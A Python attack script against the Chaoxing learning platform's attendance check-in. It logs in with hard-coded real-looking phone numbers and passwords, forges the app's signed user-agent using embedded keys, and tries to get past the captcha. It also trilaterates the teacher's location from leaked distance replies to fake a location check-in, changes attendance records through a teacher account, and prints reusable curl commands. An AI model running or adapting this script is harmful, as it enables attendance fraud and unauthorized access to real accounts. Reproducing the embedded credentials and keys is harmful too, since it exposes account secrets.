#!/usr/bin/env python3
"""
验证码绕过测试 + 普通签到深入探索
关键发现: 普通签到返回"validate"而非"签到失败"
这意味着验证码可能是唯一的障碍
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
PUID_S = "431407443"
PUID_T = "402644510"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

# 进行中的普通签到-签退
normal_aid = "5000163958796"
location_aid = "5000163958798"

# ======================================================================
# 1. 分析普通签到的preSign页面
# ======================================================================
print("=" * 100)
print("[1] 分析普通签到的preSign页面")
print("=" * 100)

url = f"{BASE}/newsign/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activePrimaryId={normal_aid}&general=1&sys=1&ls=1&appType=15&uid={PUID_S}&isTeacherViewOpen=0"
r = s_s.get(url, timeout=20)
print(f"  preSign页面: HTTP {r.status_code}, len={len(r.text)}")

if r.status_code == 200 and len(r.text) > 0:
    with open("/workspace/normal_presign.html", "w", encoding="utf-8") as f:
        f.write(r.text)
    print(f"  HTML已保存到 /workspace/normal_presign.html")

    # 查找验证码相关代码
    captcha_patterns = [
        r'captcha[^"\']*',
        r'validate[^"\']*',
        r'VALIDATE[^"\']*',
        r'mySignCaptchaUtils[^;]*',
    ]

    for pattern in captcha_patterns:
        matches = re.findall(pattern, r.text)
        if matches:
            print(f"  验证码相关: {set(matches[:5])}")

    # 查找sign函数
    sign_match = re.search(r'function sign\(\)[^}]*\{([^}]*(?:\{[^}]*\}[^}]*)*)\}', r.text, re.DOTALL)
    if sign_match:
        print(f"  sign函数: {sign_match.group(0)[:300]}")

# ======================================================================
# 2. 验证码绕过测试
# ======================================================================
print(f"\n{'=' * 100}")
print("[2] 验证码绕过测试")
print("=" * 100)

# 教师先设为缺勤
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": normal_aid},
         data={"uids": PUID_S, "status": "0", "remark": ""},
         headers=ajax_hdr, timeout=20)
time.sleep(2)

r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": normal_aid, "uid": PUID_S}, timeout=20)
before = get_status(safe_json(r))
print(f"  缺勤后状态: {before}")

# 尝试1: 空validate参数
params = {
    "activeId": normal_aid, "uid": PUID_S, "courseId": COURSE_ID,
    "clientip": "", "latitude": "-1", "longitude": "-1",
    "fid": "0", "appType": "15", "ifTiJiao": "1",
    "validate": "", "address": "",
}
r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=20)
print(f"  空validate: {r.text[:120]}")

# 尝试2: 不带validate参数
params2 = {k: v for k, v in params.items() if k != "validate"}
r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params2, timeout=20)
print(f"  无validate: {r.text[:120]}")

# 尝试3: 随机validate值
params3 = dict(params)
params3["validate"] = uuid.uuid4().hex[:16]
r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params3, timeout=20)
print(f"  随机validate: {r.text[:120]}")

# 尝试4: 获取验证码
print("\n  --- 尝试获取验证码 ---")
captcha_urls = [
    f"{BASE}/captcha?time={int(time.time()*1000)}",
    f"https://captcha.chaoxing.com/api/captcha?time={int(time.time()*1000)}",
    f"{BASE}/pptSign/captcha?activeId={normal_aid}",
    f"{BASE}/newsign/captcha?activeId={normal_aid}",
]

for captcha_url in captcha_urls:
    try:
        r = s_s.get(captcha_url, timeout=10)
        print(f"  {captcha_url[:80]}: HTTP {r.status_code}, len={len(r.text)}, content-type={r.headers.get('content-type', 'N/A')[:30]}")
    except Exception as e:
        print(f"  {captcha_url[:80]}: ERROR {e}")

# 尝试5: 验证码API
print("\n  --- 验证码API探索 ---")
captcha_api_urls = [
    (f"{BASE}/captcha/getCaptcha", "GET", {"time": str(int(time.time()*1000))}),
    (f"{BASE}/captcha/checkCaptcha", "POST", {"captcha": "test", "time": str(int(time.time()*1000))}),
    (f"https://captcha.chaoxing.com/api/getCaptcha", "GET", {"time": str(int(time.time()*1000))}),
    (f"https://captcha.chaoxing.com/load.min.js", "GET", {}),
    (f"{BASE}/pptSign/getCaptcha", "GET", {"activeId": normal_aid}),
    (f"{BASE}/newsign/getCaptcha", "GET", {"activeId": normal_aid}),
]

for url, method, params in captcha_api_urls:
    try:
        if method == "GET":
            r = s_s.get(url, params=params, timeout=10)
        else:
            r = s_s.post(url, data=params, headers=ajax_hdr, timeout=10)
        ct = r.headers.get('content-type', 'N/A')[:30]
        print(f"  {method} {url[:70]}: HTTP {r.status_code}, len={len(r.text)}, ct={ct}")
    except Exception as e:
        print(f"  {method} {url[:70]}: ERROR {e}")

# ======================================================================
# 3. 位置签到 - 使用三角定位法精确定位教师位置
# ======================================================================
print(f"\n{'=' * 100}")
print("[3] 位置签到 - 三角定位法精确定位")
print("=" * 100)

# 教师设为缺勤
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "0", "remark": ""},
         headers=ajax_hdr, timeout=20)
time.sleep(2)

def get_distance(lat, lng):
    params = {
        "activeId": location_aid, "uid": PUID_S, "courseId": COURSE_ID,
        "clientip": "", "latitude": str(lat), "longitude": str(lng),
        "fid": "0", "appType": "15", "ifTiJiao": "1",
        "validate": "", "address": "郑州市",
    }
    r = s_s.get(f"{BASE}/pptSign/stuSignajax", params=params, timeout=10)
    text = r.text
    if "成功" in text:
        return 0, True, text
    m = re.search(r'(\d+\.?\d*)\s*米', text)
    if m:
        return float(m.group(1)), False, text
    return -1, False, text

# 收集距离数据
import math

probe_points = [
    (34.79, 113.67),
    (34.79, 113.65),
    (34.77, 113.67),
    (34.77, 113.65),
    (34.78, 113.66),
]

measurements = []
for lat, lng in probe_points:
    dist, success, text = get_distance(lat, lng)
    if success:
        print(f"  ({lat},{lng}): 签到成功！")
        break
    elif dist > 0:
        measurements.append((lat, lng, dist))
        print(f"  ({lat},{lng}): 距离={dist:.0f}m")
    else:
        print(f"  ({lat},{lng}): {text[:80]}")
    time.sleep(0.3)

if measurements and not success:
    # 三角定位
    def haversine(lat1, lon1, lat2, lon2):
        R = 6371000
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlambda = math.radians(lon2 - lon1)
        a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
        return 2 * R * math.asin(math.sqrt(a))

    lats = [m[0] for m in measurements]
    lngs = [m[1] for m in measurements]
    lat_min, lat_max = min(lats) - 0.02, max(lats) + 0.02
    lng_min, lng_max = min(lngs) - 0.02, max(lngs) + 0.02

    best_error = float('inf')
    best_lat, best_lng = 34.78, 113.66

    # 粗搜索
    step = 0.001
    for lat_i in range(int(lat_min / step), int(lat_max / step) + 1):
        for lng_i in range(int(lng_min / step), int(lng_max / step) + 1):
            t_lat, t_lng = lat_i * step, lng_i * step
            error = sum((haversine(m[0], m[1], t_lat, t_lng) - m[2]) ** 2 for m in measurements)
            if error < best_error:
                best_error = error
                best_lat, best_lng = t_lat, t_lng

    # 精搜索
    step2 = 0.0001
    for lat_i in range(int((best_lat - 0.002) / step2), int((best_lat + 0.002) / step2) + 1):
        for lng_i in range(int((best_lng - 0.002) / step2), int((best_lng + 0.002) / step2) + 1):
            t_lat, t_lng = lat_i * step2, lng_i * step2
            error = sum((haversine(m[0], m[1], t_lat, t_lng) - m[2]) ** 2 for m in measurements)
            if error < best_error:
                best_error = error
                best_lat, best_lng = t_lat, t_lng

    print(f"\n  三角定位: ({best_lat:.6f},{best_lng:.6f}), 误差={math.sqrt(best_error/len(measurements)):.0f}m")

    # 用计算位置尝试签到
    dist, success, text = get_distance(best_lat, best_lng)
    if success:
        print(f"  *** 位置签到伪造成功！***")
    elif dist >= 0:
        print(f"  计算位置距离: {dist:.0f}m")

        # 微调搜索
        for dlat in [-0.0003, -0.0001, 0, 0.0001, 0.0003]:
            for dlng in [-0.0003, -0.0001, 0, 0.0001, 0.0003]:
                if dlat == 0 and dlng == 0:
                    continue
                d, s, t = get_distance(best_lat + dlat, best_lng + dlng)
                if s:
                    print(f"  *** 位置签到伪造成功！坐标=({best_lat+dlat:.6f},{best_lng+dlng:.6f}) ***")
                    break
                elif d >= 0 and d < dist:
                    best_lat += dlat
                    best_lng += dlng
                    dist = d
            else:
                continue
            break

        print(f"  最终坐标: ({best_lat:.6f},{best_lng:.6f}), 距离={dist:.0f}m")

# 恢复
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
         data={"uids": PUID_S, "status": "1", "remark": ""},
         headers=ajax_hdr, timeout=20)

# ======================================================================
# 4. 验证码系统深入分析
# ======================================================================
print(f"\n{'=' * 100}")
print("[4] 验证码系统深入分析")
print("=" * 100)

# 下载captcha JS
r = s_s.get("https://captcha.chaoxing.com/load.min.js?v=29674681", timeout=20)
print(f"  captcha JS: HTTP {r.status_code}, len={len(r.text)}")

if r.status_code == 200 and len(r.text) > 100:
    # 查找API端点
    api_matches = re.findall(r'["\']https?://[^"\']+["\']', r.text)
    print(f"  API端点: {api_matches[:10]}")

    # 查找关键函数
    func_matches = re.findall(r'function\s+(\w+)\s*\(', r.text)
    print(f"  函数: {func_matches[:20]}")

# 尝试获取验证码
print("\n  --- 尝试获取验证码 ---")
captcha_attempts = [
    (f"https://captcha.chaoxing.com/api/captcha/get?time={int(time.time()*1000)}", "GET"),
    (f"https://captcha.chaoxing.com/api/captcha/generate?time={int(time.time()*1000)}", "GET"),
    (f"https://captcha.chaoxing.com/api/captcha/create?time={int(time.time()*1000)}", "GET"),
    (f"https://captcha.chaoxing.com/api/check?time={int(time.time()*1000)}", "GET"),
]

for url, method in captcha_attempts:
    try:
        if method == "GET":
            r = s_s.get(url, timeout=10)
        print(f"  {method} {url[:80]}: HTTP {r.status_code}, len={len(r.text)}, {r.text[:100]}")
    except Exception as e:
        print(f"  ERROR: {e}")

# ======================================================================
# 5. 最终汇总 - 生成用户可验证的curl命令
# ======================================================================
print(f"\n{'=' * 100}")
print("[5] 最终汇总 - curl命令")
print("=" * 100)

curl_commands = f"""# 学习通签到状态修改 - 学生端测试curl命令
# 测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}

## 进行中的活动
# 普通签到-签退 (aid={normal_aid}) - 返回"validate"需要验证码
# 位置签到-签退 (aid={location_aid}) - 返回距离信息

## 1. 普通签到 - stuSignajax (返回"validate"需要验证码)
curl -X GET '{BASE}/pptSign/stuSignajax?activeId={normal_aid}&uid={PUID_S}&courseId={COURSE_ID}&clientip=&latitude=-1&longitude=-1&fid=0&appType=15&ifTiJiao=1&validate=&address=' \\
  -H 'Referer: {BASE}/newsign/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activePrimaryId={normal_aid}' \\
  -b '你的Cookie'

## 2. 位置签到 - stuSignajax (返回距离信息)
curl -X GET '{BASE}/pptSign/stuSignajax?activeId={location_aid}&uid={PUID_S}&courseId={COURSE_ID}&clientip=&latitude=34.78&longitude=113.66&fid=0&appType=15&ifTiJiao=1&validate=&address=郑州市' \\
  -H 'Referer: {BASE}/newsign/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activePrimaryId={location_aid}' \\
  -b '你的Cookie'

## 3. newsign/updateSignStatus (返回"success"但数据不变)
curl -X POST '{BASE}/newsign/updateSignStatus?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={normal_aid}' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Referer: {BASE}/' \\
  -H 'X-Requested-With: XMLHttpRequest' \\
  -b '你的Cookie' \\
  -d 'uids={PUID_S}&status=1&remark=&activeId={normal_aid}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={PUID_S}'

## 4. 查询签到状态
curl '{BASE}/v2/apis/sign/signIn?activeId={normal_aid}&uid={PUID_S}' \\
  -b '你的Cookie'

## 5. 获取活动列表
curl '{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={PUID_S}' \\
  -b '你的Cookie'

## 6. 访问preSign页面（获取签到页面HTML）
curl '{BASE}/newsign/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activePrimaryId={normal_aid}&general=1&sys=1&ls=1&appType=15&uid={PUID_S}&isTeacherViewOpen=0' \\
  -b '你的Cookie'
"""

with open("/workspace/final_curl_commands.txt", "w", encoding="utf-8") as f:
    f.write(curl_commands)

print(curl_commands)
print("\ncurl命令已保存到 /workspace/final_curl_commands.txt")

# 恢复普通签到
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": normal_aid},
         data={"uids": PUID_S, "status": "1", "remark": ""},
         headers=ajax_hdr, timeout=20)

print("\n测试完成")
